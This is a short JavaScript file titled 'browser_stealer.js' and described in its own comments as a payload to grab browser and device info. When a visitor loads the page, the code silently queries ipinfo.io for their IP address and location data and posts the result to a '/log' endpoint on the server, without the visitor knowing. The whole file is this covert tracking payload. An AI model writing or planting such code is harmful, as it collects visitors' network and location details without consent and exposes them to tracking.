// browser_stealer.js
// JS payload to grab browser/device info

fetch("https://ipinfo.io/json")
  .then(response => response.json())
  .then(data => {
    fetch("/log", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(data)
    });
  });

